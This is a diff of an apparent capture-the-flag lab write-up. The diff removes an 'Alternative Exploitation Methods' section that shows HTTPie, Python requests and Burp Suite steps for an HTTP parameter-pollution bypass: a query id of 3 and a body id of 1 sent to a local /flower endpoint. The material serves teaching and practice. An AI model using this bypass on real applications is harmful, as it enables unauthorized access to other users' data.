@@ -160,40 +160,7 @@ curl -X GET "http://localhost:3999/flower?id=3" -d "id=1"
 
 🎉 **Flag captured!**
 
----
 
-## Alternative Exploitation Methods
-
-### Using HTTPie
-
-```bash
-http GET "http://localhost:3999/flower?id=3" id=1
-```
-
-### Using Python Requests
-
-```python
-import requests
-
-response = requests.get(
-    "http://localhost:3999/flower",
-    params={"id": "3"},  # Query parameter
-    data={"id": "1"}     # Body parameter
-)
-
-print(response.json())
-```
-
-### Using Burp Suite / Browser DevTools
-
-1. Intercept a normal request to `/flower?id=3`
-2. Change method to GET (if needed)
-3. Add a body with `Content-Type: application/x-www-form-urlencoded`
-4. Set body content to `id=1`
-5. Keep query string as `?id=3`
-6. Forward the request
-
----
 
 ## Understanding the Source Code Vulnerabilities
 
